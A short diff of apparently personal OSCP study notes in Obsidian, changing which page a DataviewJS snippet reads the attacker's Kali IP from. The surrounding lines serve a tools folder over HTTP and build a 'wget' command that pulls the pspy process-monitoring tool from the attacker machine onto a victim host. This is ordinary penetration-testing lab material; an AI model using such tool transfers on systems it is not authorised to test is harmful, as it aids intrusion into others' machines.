@@ -10,7 +10,7 @@ cd ~/Desktop/Tools && python -m http.server 80
 
 On Victim Host
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `wget http://${KaliIP}:80/pspy64 -O pspy`;
 
